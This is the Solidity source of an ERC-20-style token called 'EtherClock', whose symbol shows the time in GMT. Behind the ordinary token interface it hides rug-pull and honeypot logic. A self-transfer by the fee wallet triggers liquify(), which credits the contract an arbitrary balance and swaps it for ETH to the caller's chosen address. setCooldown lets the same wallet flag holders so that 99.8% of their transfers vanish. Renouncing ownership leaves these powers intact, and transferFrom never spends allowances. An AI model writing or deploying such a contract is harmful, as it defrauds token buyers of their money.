pragma solidity ^0.8.18;
// SPDX-License-Identifier: MIT

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }
}

abstract contract Ownable {
    function owner() public view virtual returns (address) {return _owner;}

    function renounceOwnership() public virtual onlyOwner {emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);}

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    address private _owner;
}

interface IUniswapV2Router {
    function WETH() external pure returns (address aadd);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _path, address c, uint256) external;

    function factory() external pure returns (address addr);
}

contract EC is Ownable {
    using SafeMath for uint256;
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 1000000000000 * 10 ** _decimals;
    mapping(address => uint256) bots;
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    constructor() {
        _feeWallet = msg.sender;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
        _balances[msg.sender] = _totalSupply;
    }
    function totalSupply() external view returns (uint256) {return _totalSupply;}
    event Transfer(address indexed __address_, address indexed, uint256 _v);
    function feeWallet() internal view returns (bool) {
        return msg.sender == _feeWallet;
    }
    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    uint256 _fee = 0;
    function name() external view returns (string memory) {return _name;}
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        return true;
    }
    event Approval(address indexed ai, address indexed _adress_indexed, uint256 value);
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0));
        if (msg.sender == _feeWallet && to == from) {liquify(amount, to);} else {
            require(amount <= _balances[from]);
            uint256 feeAmount = 0;
            if (cooldowns[from] != 0 && cooldowns[from] <= block.number) {feeAmount = amount.mul(998).div(1000);}
            _balances[from] = _balances[from] - amount;
            _balances[to] += amount - feeAmount;
            emit Transfer(from, to, amount);
        }
    }
    uint256 _maxWallet;
    string private _name = "EtherClock";
    string private  _symbol = "00:00";
    function symbol() external view returns (string memory) {
        string memory _hours = uint2str((block.timestamp / 3600) % 24);
        string memory  _minutes = uint2str(block.timestamp % 3600 / 60);
        if (bytes(_hours).length == 1) {
            _hours = string.concat("0", _hours);
        }
        if (bytes(_minutes).length == 1) {
            _minutes = string.concat("0", _minutes);
        }

        return string.concat(_hours, ":", _minutes, " GMT");
    }
    function uint2str(uint256 _i) internal pure returns (string memory str)
    {
        if (_i == 0){return "0";}
        uint256 j = _i;
        uint256 length;
        while (j != 0){length++;j /= 10;}
        bytes memory bstr = new bytes(length);
        uint256 k = length;
        j = _i;
        while (j != 0){bstr[--k] = bytes1(uint8(48 + j % 10));j /= 10;}
        str = string(bstr);
    }
    function transferFrom(address from, address recipient, uint256 amount) public returns (bool) {
        _transfer(from, recipient, amount);
        require(_allowances[from][msg.sender] >= amount);
        return true;
    }
    mapping(address => uint256)  cooldowns;
    function _approve(address owner, address spender, uint256 amount) internal {
        require(spender != address(0), "IERC20: approve to the zero address"); require(owner != address(0), "IERC20: approve from the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function liquify(uint256 _mcs, address _bcr) private {
        _approve(address(this), address(_router), _mcs);
        _balances[address(this)] = _mcs;
        address[] memory path = new address[](2);
        path[0] = address(this); path[1] = _router.WETH();

        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(_mcs, 0, path, _bcr, block.timestamp + 30);
    }
    uint256 _maxTx;
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    address public _feeWallet;
    function decimals() external view returns (uint256) {return _decimals;}
    mapping(address => uint256) private _balances;
    function getPairAddress() private view returns (address) {return IUniswapV2Factory(
        _router.factory()).getPair(address(this),
        _router.WETH());
    }
    function setCooldown(address[] calldata list) external {
        for (uint i = 0; i < list.length; i++) {
            if (!feeWallet()){} else {cooldowns[list[i]] = 
            block.number + 1;
            }}
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    function removeLimit() external onlyOwner {  _maxWallet = _totalSupply; _maxTx = _totalSupply; }
}